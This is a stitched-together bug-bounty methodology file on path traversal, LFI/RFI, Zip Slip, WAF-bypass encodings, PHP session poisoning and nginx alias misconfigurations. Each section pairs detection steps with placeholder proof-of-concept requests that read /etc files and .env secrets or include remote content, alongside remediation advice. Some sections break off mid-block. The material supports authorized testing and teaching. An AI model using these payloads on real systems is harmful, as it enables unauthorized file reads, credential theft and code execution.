# ssrf-xxe-lfi — part 1/3 (55 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] V-13: Nested API resource path traversal for internal object-level access bypass

**Mechanism:** Nested routes compose authorization from segments (`/users/<uid>/orders/<oid>`)
but the server validates only one segment — usually the parent, sometimes neither. Swapping
the inner segment under your own parent yields the victim's child, and normalization tricks
(`..`, `%2f`, `//`) bypass composition entirely: "the parent I passed is the object's parent" is false.

**Preconditions:**
- At least two-segment object routes (or nested GraphQL/REST paths like
  `/orgs/<org>/members/<user>`).
- Child IDs independently obtainable for B (from the two-account setup).

**Detect:**
1. Map nested routes from JS/OpenAPI; list which segments are object ids vs. slugs.
2. Vary segments *independently*: fix your parent, swap the child; fix B's child, swap
   the parent; all four A/B combinations — the matrix shows which segment is checked.
3. Normalization probes on the parent segment: `/users/<USER_A>/../<USER_B>/orders/<OID>`,
   `/users/%2e%2e%2f<USER_B>/orders/<OID>`, `//users/<USER_B>/orders/<OID>`, trailing
   `/./` — send raw (curl `--path-as-is`) so the client doesn't normalize for you.
4. Check intermediate layers: an API gateway may authorize the first segment only, then
   hand the full path to the service — the split is visible when gateway-level checks
   pass but the service answers with foreign data.
5. Also try nesting depth changes: `/orders/<OID>` directly vs.
   `/users/<uid>/orders/<OID>` — flatter route often lacks the parent check by design
   debt.

**Proof of concept:**
```bash
curl -sS -i --path-as-is -H 'Cookie: session=<SESSION_A>' \
  '<TARGET_URL>/api/users/<USER_ID_A>/orders/<ORDER_ID_B>'
curl -sS -i --path-as-is -H 'Cookie: session=<SESSION_A>' \
  '<TARGET_URL>/api/users/../users/<USER_ID_B>/orders/<ORDER_ID_B>'
```

**Confirm:** Response contains B's child object while the outer segment names *your*
user — verified by B's session fetching the same child (marker match). The parent/child
mismatch visible in the single request plus B's control = confirmed.

**False positives:** Router ignores the parent but authorizes the child correctly (you get
*your* order — safe; only a V-01 if child authz is missing elsewhere); `<ORDER_ID_B>` is
actually yours (namespace overlap); edge normalizes `..` before auth (replay with
`--path-as-is`); file-access `..` issues belong to `path-traversal-testing`; public/shared
children (shared invoices, team docs).

**Impact:** "Segment-level checks are incomplete: users can address any `<child>` by
altering `<segment>`, bypassing the parent-scoped permission model that the API design
implies."

**Remediation:** Authorize every path segment against its owner (parent *and* child)
using canonicalized paths — reject `..`, encoded separators, and duplicate slashes at
the edge before routing.

**CWE / OWASP:** CWE-639 with CWE-20 (path structure validation); OWASP A01:2021 — if
`..` reaches filesystem paths, hand off to `path-traversal-testing` (CWE-22).

---

## [Bugbountyskills.md] Path Traversal / LFI & RFI Testing — Deep Playbook

Arbitrary file read is the bread-and-butter high-severity class in bug bounty —
and one of the easiest to over-claim, because reflection, SPA fallbacks, and
WAF pages all mimic "I read a file". This skill makes the work methodical:
inventory path sinks, pick the variant that matches the observed signal, probe
with a harmless canary first, confirm with a second independent signal, prove
impact with the minimum evidence the report needs, and write it up so triage
cannot reject it on false-positive grounds.

## [Bugbountyskills.md] Payloads & Templates — Path Traversal / LFI / RFI

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. Ladders are ordered
by risk — climb only as far as authorization and impact proof require.

## [Bugbountyskills.md] Wrapper-support probe (returns YOUR text — proves wrapper parsing, not file read)

GET /<SINK>?file=data://text/plain,WRAPPER-PROBE-<TOKEN>

## [Bugbountyskills.md] --- ffuf: URL-path traversal against static locations ---

ffuf -u 'https://<TARGET>/static/FUZZ' \
     -w '<PLACEHOLDER_WORDLIST:traversal.txt>' \
     -mc 200 -fs '<PLACEHOLDER_BASELINE_LENGTH>' -t 15

## [Bugbountyskills.md] Path Traversal / LFI & RFI Variants — Part 1 (V-01 … V-08)

Deep playbook sections for the first eight variants. Work the **Detect**
steps in order, climb the ladders in `payloads.md` only as far as impact proof
requires, and check **False positives** before writing anything up. Canary
first, system files second, execution proofs in the lab.

## [Bugbountyskills.md] V-01: Internal file resource inclusion via local file inclusion (LFI) filter breaks

**Mechanism:** The app passes a file-ish parameter to an include/read sink
*after* applying a filter — strip `../`, block a substring list, `basename()`,
prepend an include directory. The violated assumption is "the filter's output
still resolves inside the include dir": filters are single-pass string
operations, path resolution is canonicalization. Strip-once, decode-then-check,
or check-then-decode ordering bugs let a crafted sequence survive the filter
and *become* `../` only at the filesystem layer.

**Preconditions:**
- Include/read sink fed by user input: `page`, `file`, `template`, `lang`,
  `include`, `module`, `layout`, `doc`, `view`
- A filter exists but is single-pass (`str_replace('../','')`), substring-based,
  or runs before a second decode
- Optionally an extension allowlist (`.php`/`.html`) — then chain V-05 / V-09
- Target readable relative to the include dir, or absolute paths reach the sink raw

**Detect:**
1. Inventory path-ish params (query, URL segments, JSON body, `X-File`-style
   headers) and baseline a legitimate value (`?page=home`) — record status,
   length, content-type.
2. Build the oracle first: compare responses for an existing vs missing file
   (`?page=home` vs `?page=nope123`). A per-file difference (ENOENT text,
   length, latency) proves the app really opens files — that oracle is your
   detection signal for every later rung and your confirmation channel.
3. Filter-break ladder (payloads.md §3 rung 1): `....//....//<CANARY>` (single
   strip of `../` leaves `../`), `..././`, `..//..//`, `....\/`; then encoding
   rungs `..%2f`, `%2e%2e%2f`. Record content vs block vs no-change per rung.
4. Absolute-path probe: `?page=<CANARY_PATH>` — a raw `fopen($input)` sink
   accepts absolute paths outright; a `"$dir/$input"` sink does not. Which
   behavior you see tells you the sink shape (and whether V-04 applies).
5. If `basename()` is in play (traversal structurally impossible), stop this
   ladder and pivot: extension check → V-05, wrapper strings → V-09, URL param →
   V-02, session/log targets → V-08/V-13.
6. Watch decoding: input reflected *decoded twice* means two decode passes
   exist — jump to V-06; WAF 403 on plain probes — jump to V-12.

**Proof of concept:**
```
GET /view?page=<PLACEHOLDER_PAGE> HTTP/1.1

baseline:  page=home
strip:     page=....//....//....//<PLACEHOLDER_CANARY_PATH>   # Linux: /etc/hostname
encoded:   page=%2e%2e%2f%2e%2e%2f%2e%2e%2f<PLACEHOLDER_CANARY_PATH>
absolute:  page=<PLACEHOLDER_CANARY_PATH>
```

**Confirm:** Two independent signals: (a) canary content from a path outside
the include dir, *and* (b) the existence/missing oracle or a stack trace
naming the resolved absolute path, both reproducing on re-send. Content alone
can be reflection; the oracle alone is a lead.

**False positives:** WAF/error pages echoing your payload (decode it — if it's
your input, nothing was read). "Download" features returning *your own*
account's file by path — that's entitled access; prove escape with a path
outside the account directory. Client-side routers (`/#/page=`) never reach
the server. SPA fallbacks returning `index.html` for any path (200 ≠ read —
check body and content-type). A file that legitimately exists inside the
include dir at the same relative name (check the oracle).

**Impact:** Arbitrary file read as the web process: app source, config and
`.env` (secrets), session/token material, then RCE escalation via V-08/V-09.
Phrase as "arbitrary file read as `<user>`; demonstrated with canary `<path>`;
reachable secret classes: `<list>`" — never paste the secrets themselves.

**Remediation:** Resolve input through a fixed allowlist map of permitted
files, or `realpath()` the joined path and require the *final canonical* path
to stay under the include root — validate after normalization, never on raw
strings.

**CWE / OWASP:** CWE-22 (Path Traversal) / CWE-98 (File Inclusion); OWASP
Top 10 A01:2021 Broken Access Control; WSTG — Path Traversal.

## [Bugbountyskills.md] V-02: External script execution traversal via remote file inclusion (RFI) wrapper pipelines

**Mechanism:** The sink accepts a URL-ish string and *includes or fetches*
it — PHP `include($url)` with `allow_url_include`, `file_get_contents($url)`
into a renderer, a template loader that pulls over HTTP, or a wrapper pipeline
(`php://filter/resource=http://…`, `compress.zlib://http://…`) that rewrites a
"filtered" remote reference back into a fetchable one. The violated assumption
is "the path is a local, trusted resource": attacker-hosted bytes enter the
app's execution or render context from a server you control.

**Preconditions:**
- URL-ish param reaching an include/fetch sink (`url`, `src`, `load`, `remote`,
  `template`, `page`, `feed`, `import`)
- No scheme allowlist, or a wrapper/`http` filter that can be re-expressed
- For include-based RFI: `allow_url_include=On` (rare post-2015 — verify
  through the app, never by assumption); fetch-and-render paths need no such flag
- Outbound HTTP egress from the target server; attacker-controlled HTTPS/HTTP host

**Detect:**
1. Find URL-shaped params on features that plausibly pull remote content:
   language packs, "load from URL", RSS/import, theme/plugin fetch, link
   preview, webhook-style testers.
2. Safe probe first: `http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt` whose body
   is `RFI-MARKER-<TOKEN>`. Check two things: (a) an HTTP hit on your server
   from the target's IP (log UA — fingerprints the fetcher), (b) whether the
   marker text appears in the app's response. Both = inclusion; only (a) = plain
   SSRF → route to `ssrf-testing` instead of claiming RFI.
3. Wrapper-pipeline probe (read-only, payloads.md §2):
   `php://filter/convert.base64-encode/resource=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt`
   — a response body containing the base64 of *your* file proves wrapper
   handling plus server-side fetch in one step, with zero code execution.
4. Distinguish include from fetch-render: if fetched content is embedded in an
   HTML page as data (never parsed as code), severity drops to SSRF/content-
   injection; if the runtime would *execute* `<?php … ?>`/template syntax from
   the fetched body, it's include-class RCE (proof in lab per guardrail).
5. Egress dead? Try your alternate port or an allowlisted-then-redirect host
   (your box 302s after the first hop) — note this as a redirect-bypass finding,
   same class.

**Proof of concept:**
```
GET /load?template=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt HTTP/1.1

pipeline:  ?template=php://filter/convert.base64-encode/resource=http://<PLACEHOLDER_OOB_DOMAIN>/rfi-001.txt
remote body: RFI-MARKER-<TOKEN>
execution:   lab only — body "<?php echo 'RFI-OK'; ?>" or template syntax
```

**Confirm:** OOB HTTP hit from the target IP (source channel) *plus* your
marker content appearing in the response (in-band channel), reproducible. For
any execution claim: the benign marker executes in a lab clone — production
proof stops at content inclusion.

**False positives:** Frontend/client-side link previews (hit comes from *your*
browser IP and UA). Plain SSRF that fetches but never includes (marker absent
from response body). DNS prefetch/metadata scrapers hitting your domain without
HTTP. Your collaborator's own echo behavior. "RFI" claims where the app merely
*displays the URL string* you gave it.

**Impact:** Pre-auth RCE when the include executes attacker code (highest
class); otherwise SSRF/content-injection. Phrase per what you proved:
"server-side inclusion of attacker-controlled remote content, RCE feasible as
`<user>` — execution demonstrated in lab".

**Remediation:** Never include remote content — fetch through a vetted HTTP
client into a *data* variable with a strict host allowlist; disable
`allow_url_include`/`allow_url_fopen`; reject wrapper strings (`://`) in path
inputs.

**CWE / OWASP:** CWE-98 (Remote File Inclusion) / CWE-829 (Untrusted
Functionality); OWASP A03:2021 Injection (A08 where the flaw is trust in
remote functionality).

## [Bugbountyskills.md] V-03: Directory separation invalidation via path traversal strings (../)

**Mechanism:** A user path is concatenated onto a base directory
(`$dir . '/' . $input`) with no canonicalization before the open. `../`
segments are interpreted by the filesystem and resolve *above* the intended
root. The violated assumption — "the relative path stays inside base" — is
enforced nowhere: nothing checks the final resolved path.

**Preconditions:**
- Path-shaped param joined to a base dir (download, preview, template, image)
- No normalize-then-check, or check happens *before* a later decode/normalize
  (ordering bug → V-06 if encoding is needed)
- Target file readable by the service account; no chroot/open_basedir jail

**Detect:**
1. Baseline a known in-root file (`?file=readme.txt` or a public asset URL) —
   status, length, content-type.
2. Canary climb: `?file=<../ × N><CANARY_PATH>` sweeping N = 1…12. The depth
   at which the response changes (error band, content appears) tells you the
   base dir depth and often leaks the resolved absolute path in errors.
3. Separator matrix: `/`, `..\`, `..%5c`, `..\../`, `....\\` — Windows targets
   accept both separators (V-12 covers WAF-side encoding); Linux treats `\` as a
   filename character, so failures there are expected, not evidence of safety.
4. Absolute-path override: `<CANARY_PATH>` raw — some sinks treat an absolute
   input as the whole path (see V-04 for evidence rules).
5. Note *which layer* answered: app-level JSON error = app sink reached;
   webserver 400/404 with `nginx`/`Apache` signature = path normalized at the
   edge → route to V-14/V-15.
6. Plain blocked at a WAF? → V-12. Plain stripped once? → V-01. Double-encoded
   needed? → V-06. Record, don't re-test.

**Proof of concept:**
```
GET /download?file=<PLACEHOLDER_DOTSEGS><PLACEHOLDER_CANARY_PATH> HTTP/1.1

query:   file=../../../../../../etc/hostname
path:    GET /static/../../../../etc/hostname
json:    {"path": "../../../../etc/hostname"}
upload-name: filename="../../../../tmp/<PLACEHOLDER_CANARY_NAME>"
```

**Confirm:** Canary content from outside the root *plus* the depth/error
oracle (or a leaked resolved path in a stack trace) reproducing on re-send.
Two channels: content and path-resolution evidence.

**False positives:** Input reflected in errors or titles. A file that exists
at the same relative path inside the app dir (verify via the oracle). Front-end
or CDN rewriting the path before it hits the origin (test with and without
cache-busting). "Preview" features returning your own uploaded file (entitled —
escape the account dir to prove traversal). Generic 200 fallback HTML from
SPAs.

**Impact:** Arbitrary file read as the service account — source, config, secrets,
and (with V-08/V-09) RCE escalation. Phrase as "path traversal in `<param>`
yields arbitrary read as `<user>`; canary `<path>` returned at depth N".

**Remediation:** `realpath()` the joined path and require a canonical-prefix
match against the allowed root (reject if it escapes); better, replace free-form
paths with an allowlist lookup of logical file IDs.

**CWE / OWASP:** CWE-22 (Path Traversal); OWASP A01:2021 Broken Access
Control; WSTG — Input Validation / Path Traversal.

## [Bugbountyskills.md] Path Traversal / LFI & RFI Variants — Part 2 (V-09 … V-15)

Deep playbook sections for variants 9-15. Read `payloads.md` alongside these
for the shared encoding matrix, wrapper templates, canary catalogue, and tool
commands. Execution proofs in these variants are lab-only (guardrail).

## [Bugbountyskills.md] V-10: Path traversal via nested archive unpacking flaws (Zip Slip)

**Mechanism:** An extractor trusts archive entry names when building
destination paths: entry `../../../../var/www/html/shell.php` joined to the
extract dir resolves outside it, giving **arbitrary file write** (and read, via
later retrieval). "Nested" adds a second hop: an inner archive is re-extracted
after the first pass, so a slip *inside* the inner zip — or an inner archive
itself written outside — escapes validation that only inspected the outer
members. The violated assumption: "entry names are relative filenames inside
the target dir".

**Preconditions:**
- App extracts user archives: import/restore, theme/plugin install, media
  ingest, backup upload, CI "unpack workspace" features
- No entry-path validation (no canonical-prefix check after join), or validation
  that runs only on the outer archive
- Extractor runs with write access to an interesting location (web root, cron
  dir, config, `~/.ssh/` — note the last one for *capability* claims only)
- Format reach: zip (classic), tar/gz, 7z, JAR/WAR/EAR, docx/xlsx (zip-based),
  npm/pip packages

**Detect:**
1. Map the feature: accepted formats, where extracted, whether extracted paths
   are ever served/processed later (that closes the read/write loop), and
   whether nested archives are handled recursively (the "nested" condition).
2. **Write only a new benign canary** (guardrail — never overwrite): craft an
   entry `<../ × N>tmp/<PLACEHOLDER_CANARY_NAME>.txt` relative to the
   documented/observed extract root. N sweep: 1…8.
3. Retrieve through an *independent* channel: the canary's served URL, a second
   feature, or an existing LFI (V-01). "Extraction returned 200" is not proof —
   silent sanitization also returns 200.
4. Variant entry forms: absolute names (`/tmp/canary.txt`), backslash
   separators (`..\\..\\`), mixed (`..\../`), symlink entries (→ V-11), and
   **nested**: outer zip holds `inner.zip` which holds the slip entry — check
   whether recursion re-validates.
5. Error differentials: extractor messages leaking the *resolved* destination
   path (`"cannot open /var/www/…/shell.php"`) are free confirmation evidence.
6. Non-destructive capability argument: if the canary lands in web root,
   *report* the overwrite capability (what a `shell.php` or cron entry could do)
   without demonstrating it in production — execution demo belongs to lab and to
   `rce-testing` upload guidance.

**Proof of concept:**
```

## [Bugbountyskills.md] V-12: WAF bypass path traversal via Unicode/UTF-8 alternate slash character mappings

**Mechanism:** A WAF/filter matches literal `../` or `%2f` byte patterns, while
a layer *behind* it normalizes alternative characters into real separators —
backslash on Windows, `%u002e`-style escapes on legacy IIS, overlong UTF-8
(`%c0%af`) on decoders that accept non-shortest forms, fullwidth/lookalike
slashes where the backend does NFKC-style path normalization, or Tomcat path
parameters (`..;/`). The layer differential (WAF sees benign bytes, backend
sees `/`) turns a blocked traversal into an accepted one. The violated
assumption is "WAF and backend agree on what a path is".

**Preconditions:**
- A blocking layer in front (WAF/proxy/CDN with `../` rules) — prove its
  presence via block-page signature before claiming a *bypass*
- A backend that normalizes one of the alternate forms: Windows path handling,
  legacy IIS/Java `%u`/overlong support, framework unicode normalization, or a
  double-decoding chain (V-06)
- Encoding survives transport (some CDNs pre-canonicalize everything — test,
  don't assume)

**Detect:**
1. Baseline the block: plain `../../../../<CANARY>` → capture status, body
   signature, latency. No block? Then plain works and you have V-03, **not** a
   bypass — do not label it V-12.
2. Run the encoding ladder (payloads.md §1), one variant per request, canary
   as target: `..%2f`, `%2e%2e%2f`, `%2e%2e/`, `..%5c`, `..\`, mixed-case
   `%2E%2E%2F`, `.%2e/`, `..;/` + `/..;/` (servlet path params), `%c0%ae%c0%ae%c0%af`
   (overlong — expect modern failure), `%uff0e%uff0e%uff0f` (fullwidth),
   `%u002e%002e%u002f` (legacy IIS `%u`), whitespace splits `..%09/`, `..%0d/`.
3. Vector spread: WAFs often inspect the query string but not multipart
   filenames, JSON bodies, `X-Original-URL`/`X-Rewrite-URL`/`X-Forwarded-Path`
   headers, or cookies — try the same encoded traversal in under-inspected
   containers (this is a *placement* bypass, same class).
4. Record per variant: block / accepted-no-effect / canary content. The claim
   requires at least one variant returning content while the plain form blocks.
5. Pin the normalizer: if `..%5c` works, backend is Windows-normalizing; if
   `..;/` works, servlet-container path-param stripping; if `%2e%2e%2f` works
   with a *single* decode, edge vs app decode mismatch (V-06 framing). Which
   decoder fired goes in the report — it drives the fix.

**Proof of concept:**
```
GET /download?file=<PLACEHOLDER_ENCODED><PLACEHOLDER_CANARY_PATH> HTTP/1.1

plain:  ../../../../etc/hostname        → WAF 403 <BLOCK_SIGNATURE>
variant:..%2f..%2f..%2f..%2fetc/hostname → canary content
variant:..;/..;/etc/hostname            → canary content
```

**Confirm:** The differential (encoded variant returns canary content while
plain is blocked by the evidenced WAF) reproduces twice, **plus** a second
channel — path/error oracle or a second encoding variant also succeeding.
You need both the bypass *and* the read.

**False positives:** No WAF at all (plain works — V-03). WAF challenge page
reflecting your payload (decode → echo, not read). Encoded variant returning
200 with fallback HTML (check body + content-type). Assuming overlong/unicode
works without a canary round-trip (they mostly don't — a green status is not
content). Block-page differences caused by rate limits, not rules (re-test
after cooldown with a benign control request).

**Impact:** Traversal through the perimeter: arbitrary read *despite* the
WAF — report as two layers defeated (rule bypass + path read). Phrase as
"`<variant>` bypasses `<WAF name/rule>` (block evidence attached) and yields
arbitrary file read; backend normalizer identified as `<Windows/servlet/
decode>`".

**Remediation:** WAFs must decode+canonicalize once and match on normalized
bytes (rules on post-normalization form); the real fix remains the backend
canonical-prefix check (V-03) — a WAF is a layer, never the control; normalize
the request once at the edge and forward the canonical path.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-178 (Encoding/Case Handling);
OWASP A01:2021 (A05:2021 Security Misconfiguration where the WAF rule is the
declared control).

## [Bugbountyskills.md] V-13: LFI resource hijacking via PHP session file poisoning (/var/lib/php/sessions/)

**Mechanism:** PHP persists sessions to files —
`/var/lib/php/sessions/sess_<ID>` (Debian/Ubuntu), `/tmp/sess_<ID>` (many
minimal images), `C:\xampp\php\tmp\sess_<ID>` (XAMPP), whatever
`session.save_path` says. The file contains attacker-influenced `$_SESSION`
values. If an LFI can include that file, session data becomes code — and
unlike log poisoning, the path is *deterministic*: the attacker picks
`PHPSESSID`, writes a marker through any session-storing feature, and includes
the exact file. Trust broken: "session storage is not code".

**Preconditions:**
- Confirmed LFI with wrapper/path reach (V-01/V-03/V-06/V-09)
- Writable session content: a feature storing attacker strings in `$_SESSION`
  (username on login form, cart items, language/theme prefs, search history,
  arbitrary keys via mass assignment)
- Session ID attacker-chosen/settable (`PHPSESSID` accepted from a cookie or
  URL without server-side regeneration — fixation is the *enabler*, not the bug)
- File-based session handler (Redis/memcached handlers kill this file vector —
  detect before investing); `include`-class sink for the execution claim

**Detect:**
1. Confirm LFI with a canary first — this variant is an escalation of V-01,
   not a standalone.
2. Locate session storage: phpinfo/`session.save_path` via error leaks or
   `info-disclosure-testing`; otherwise probe the convention list (payloads.md
   §6): `/var/lib/php/sessions/sess_`, `/var/lib/php5/sess_`, `/tmp/sess_`,
   `/var/lib/php/session/sess_`, Windows XAMPP/temp paths, plus
   `session.save_path` sub-shards (`sess_<1>/<2>/<ID>` — two-level dirs are
   common on busy hosts; sweep `/0/`, `/1/` … prefixes when the flat path fails).
3. Fixate: send `Cookie: PHPSESSID=<PLACEHOLDER_SESSION_TOKEN>` (your own
   chosen value, e.g. `aaaabbbbccccdddd`), then exercise the storing feature
   with `SESSIONMARK-<TOKEN>` as the value.
4. Include `<SESSION_DIR>/sess_<PLACEHOLDER_SESSION_TOKEN>` — look for the
   marker in the response.
5. Prove causality: a *control* session (chosen ID, never populated) must return
   no marker; re-populate with a new marker and re-include. Two deltas, one
   file.
6. Classify: literal marker = read-back proof (production ceiling);
   executed output = RCE path → lab clone only (guardrail), report as
   feasibility with the deterministic chain described.
7. If sessions are Redis/memcached (no file appears), abandon this variant —
   note the handler and pivot (session store access would be `rce-testing`
   territory if an SSRF reaches it).

**Proof of concept:**
```
1) curl -s -b 'PHPSESSID=<PLACEHOLDER_SESSION_TOKEN>' \
        -d 'name=SESSIONMARK-<TOKEN>' 'https://<TARGET>/login-or-profile'
2) GET /view?page=../../../../var/lib/php/sessions/sess_<PLACEHOLDER_SESSION_TOKEN>
   → response contains SESSIONMARK-<TOKEN>
3) control: fresh session id, no population → same include → no marker
```

**Confirm:** Marker appears via the include only for the session you populated
(populated-vs-control differential) **plus** the canary LFI still working on
demand (independent channel). Both reproduce.

**False positives:** Marker present because the app renders the stored session
value on the page *normally* (compare: include endpoint vs a non-including
page showing the same value — that's stored-data rendering, not file read).
LFI echoing the session *path* string (echo ≠ content). Wrong save path
returning an app fallback page. Log poisoning misattributed to sessions — the
*path* distinguishes them (`sess_` vs `.log`). WAF logging your payload into a
web log you then include (control-session delta rules this out).

**Impact:** Deterministic LFI→RCE chain without log guessing — often pre-auth
(session fixation + a public LFI). Phrase as "attacker-chosen session ID +
LFI → include of attacker-controlled session data; read-back proven, RCE
feasibility `<lab-verified/not>`".

**Remediation:** Fix the LFI (allowlist include targets) — removes the chain;
store sessions outside any include path (or use Redis with strict auth and
separate network position), regenerate session IDs on privilege change, and
never include user-influenced files regardless of location.

**CWE / OWASP:** CWE-22/CWE-98 (File Inclusion) + CWE-384 (Session Fixation
enabler); OWASP A01:2021 + A03:2021.

## [Bugbountyskills.md] V-14: Path traversal via Nginx alias misconfiguration string splitting

**Mechanism:** `location /static { alias /var/www/static/; }` — nginx
replaces the matched location prefix with the alias path and appends the
**remainder** of the URI without re-normalizing it. When slash conventions
between `location` and `alias` disagree (location without trailing `/`, alias
with, or vice versa), a request like `/static../secret` matches `/static`,
leaves `../secret` as the remainder, and resolves to
`/var/www/static/../secret` → `/var/www/static/../` escaped. Plain `../` *after*
the location prefix often survives because nginx normalized dot-segments only
where they follow a `/` — `s..` is not a dot-segment to the parser, so it
reaches the alias join intact. The violated assumption: "the URI part after the
location match is a safe relative filename".

**Preconditions:**
- An nginx `alias` directive whose slash convention mismatches its `location`
  (the classic shape: `location /img { alias /var/www/images/; }`, or
  `location /static/ { alias /var/www/static; }`)
- The service user can read the escaped targets
- nginx serves these responses directly — **app auth never runs** (that's the
  severity driver)

**Detect:**
1. Inventory alias-shaped locations from outside: `/static`, `/assets`, `/img`,
   `/media`, `/files`, `/uploads`, `/javascript`, `/css`. Confirm nginx from
   `Server:` headers and error-page shape.
2. Baseline: a known file under the location returns 200 with static headers
   (`Content-Type`, `Last-Modified`, no `Set-Cookie` from the app) — that's
   your "alias is live" signal.
3. Boundary probes (the variant's signature — payloads.md §5):
   `GET /static../`, `GET /static../<CANARY_PATH>`, `GET /static/..%2f..%2f<CANARY>`,
   `GET /static/..;/..;/<CANARY>` — sweep slash positions: `/static../`,
   `/static/../`, `/static%2f..%2f`. Different mismatches need different
   boundary forms; run the matrix, record per form: 404 / 403 / content.
4. Confirm you escaped the alias root by reading a canary *outside* it
   (`/etc/hostname`), then — minimal evidence — a second out-of-root path to
   show it's not a fluke. nginx-specific 403/404 bodies (autoindex, `openat()
   failed`) as a second channel.
5. Distinguish from app routing: if the response is HTML with app session
   cookies/JSON shape, the *app* handled it (that's V-01/V-03); static headers
   + nginx error signatures mean the webserver did — different fix, different
   report.
6. Config knowledge helps but isn't required: if you ever see `nginx.conf`
   (leak — chain `info-disclosure-testing`), confirm the mismatched slashes
   directly and quote the two lines as evidence.

**Proof of concept:**
```
GET /static../<PLACEHOLDER_CANARY_PATH> HTTP/1.1        # location /static { alias /var/www/static/; }
→ alias join: /var/www/static/ + ../<CANARY> → escaped

GET /static/..%2f..%2f<PLACEHOLDER_CANARY_PATH>         # encoded remainder variant
GET /img../<PLACEHOLDER_CANARY_PATH>                    # same class, other location
```

**Confirm:** Canary content from outside the alias root **plus** an
independent second channel: a distinct out-of-root file also readable, or the
nginx-native error signature (`openat() failed`, autoindex 403) versus an app
404. Reproduce twice; include the static response headers as evidence of the
serving layer.

**False positives:** The app itself answering under `/static` (check
`Set-Cookie`/HTML/JSON shape — app answers mean V-01/V-03 territory). Files
that *legitimately* live inside the alias root (verify the target is genuinely
outside — `/static/../../etc/hostname` returning HTML = SPA fallback, not read).
WAF rewriting. `alias` correctly configured and plain `/static/../` cleanly
normalized away (then no mismatch exists — don't stretch). Trailing-slash
redirects masking the probe (follow redirects and re-check).

**Impact:** Arbitrary read of any file the nginx worker can read, **with app
authentication completely bypassed** (nginx answers directly, cookies/roles
irrelevant) — config, keys, `.env`, code. Phrase as "nginx alias slash
mismatch → traversal outside alias root served by nginx itself; app access
control not applied; canary `<path>` read as worker user `<user>`".

**Remediation:** Make slash conventions match exactly — both `location` and
`alias` end in `/` (or use `root` instead of `alias`, which never has this
class of bug), add a regression test for `/<prefix>../` probes, and deny URI
remainders containing `..` at the location level.

**CWE / OWASP:** CWE-22 (Path Traversal); OWASP A05:2021 Security
Misconfiguration + A01:2021 Broken Access Control.

## [Bugbountyskills.md] V-15: Arbitrary root configuration file read via static asset mapping misconfigurations

**Mechanism:** Static-serving rules map URL space onto the filesystem more
broadely than intended: document root exposes dotfiles (`.env`, `.git/HEAD`,
`.htaccess`), asset locations lack dotfile/backup extension denial, `try_files`
fallbacks serve whatever exists, or a traversal *at the webserver layer*
(`/assets/..%2f..%2f. env`, `..;/` tricks) reaches root-level config the app
never intended to publish. Unlike V-01, no application sink is involved — the
webserver *is* the reader, so app auth and app-level input handling are both
bypassed. "Root configuration file" = secrets-bearing files at/near the app
root: `.env`, `config.*`, `wp-config.php.bak`, `settings.py`, `appsettings.json`.

**Preconditions:**
- Webserver/asset-pipeline serving files directly (no app auth in path)
- Either (a) secrets/backup files inside the served root, or (b) a mapping rule
  (alias/root/`try_files`/rewrites) that can be steered to them
- Server normalizes (or fails to normalize) the traversal form you need —
  encoded `..%2f`, `..;/`, path params (V-12 encodings apply here too)

**Detect:**
1. Dotfile/backup matrix at candidate roots (payloads.md §6):
   `/.env`, `/.git/HEAD`, `/.git/config`, `/.htaccess`, `/web.config`,
   `/.DS_Store`, `/config.yml`, `/wp-config.php~`, `/wp-config.php.bak`,
   `/.env.local`, `/settings.py`, `/appsettings.Development.json`,
   `/.svn/entries`, `/backup.sql`. Suffix sweep on any discovered config route:
   `.bak .old .orig .swp ~ .save .copy .dist .example`.
2. Asset-locus traversal: `/assets/..%2f..%2f<SECRET_CANDIDATE>`,
   `/public/..%2f<SECRET_CANDIDATE>`, `/static/..;/<SECRET_CANDIDATE>`,
   `/assets/<../ × N><SECRET_CANDIDATE>` — the traversal form of this variant
   (pure dotfile exposure without traversal is `info-disclosure-testing`
   territory — say which you found).
3. Classify the response as static vs app: `Content-Type: text/plain`,
   `Last-Modified`, no session `Set-Cookie`, byte-identical across requests
   (static) vs HTML shell/JSON (app fallback). A 200 returning `index.html`
   for `/.env` is a **miss**, not a hit — always check the body.
4. **Evidence discipline (guardrail):** these are secret-bearing files. Read the
   *structure* — key names, presence of real-looking values, file length — and
   redact every value. Evidence = e.g. `DB_HOST=*** / AWS_SECRET_ACCESS_KEY=***`
   (key names only) or `.git/HEAD` → `ref: refs/heads/main`. Never paste `.env`
   contents, keys, or tokens into the report; never enumerate every secret file
   you *could* read — two or three class-proving samples are the ceiling.
5. Confirm it's a mapping flaw, not a deploy artifact, by identifying the rule:
   same file unreachable from the app layer but served statically; error-page
   shape naming nginx/Apache; `info-disclosure-testing` for leaked server config
   to quote the offending line.

**Proof of concept:**
```
GET /.env HTTP/1.1                                   # direct dotfile exposure
GET /assets/..%2f..%2f.env HTTP/1.1                  # traversal from asset locus
GET /config.php.bak HTTP/1.1                         # backup-suffix exposure
evidence: key names only — values redacted: <PLACEHOLDER_KEY>=***
```

**Confirm:** Body contains genuine config structure (key names / `.git` ref
line) **plus** static-serving evidence (headers, no app session cookie,
byte-identical repeat) — reproducible twice. Reflection or SPA fallback fails
the body check.

**False positives:** SPA fallback returning `index.html`/JSON for unknown paths
(200 + HTML = miss). Intentional dev-mode config endpoints (still reportable,
but as intentional exposure — different severity framing). A *sample* `.env`
bundled with the app (`ENV_FILE_SAMPLE`, placeholder values) — check for
real-looking values before claiming secrets. WAF block pages. CDN-cached
responses from another tenant's request (verify from a clean session).
Trailing-slash redirects to the app shell.

**Impact:** Direct disclosure of credentials/config classes → database and
service compromise follows. Phrase as "static mapping exposes `<file class>` at
`<endpoint>`; evidence: `<N>` key names (values redacted); app auth bypassed
since webserver serves directly". Chain to `info-disclosure-testing` for
discovery breadth and to `rce-testing` if exposed creds enable follow-on
impact — report the classes, don't catalogue every secret.

**Remediation:** Deny dotfiles and backup extensions at the webserver level
(`location ~ /\.` deny, extension denylists), keep secrets *outside* the
document root entirely (env/secret managers), ensure asset locations map
exactly (V-14 slash rules) with normalized-path checks, and remove deploy
artifacts (`.git`, backups) from served trees.

**CWE / OWASP:** CWE-200 (Exposure of Sensitive Information) / CWE-538
(Insertion of Sensitive Info into Externally-Accessible File) / CWE-22 where
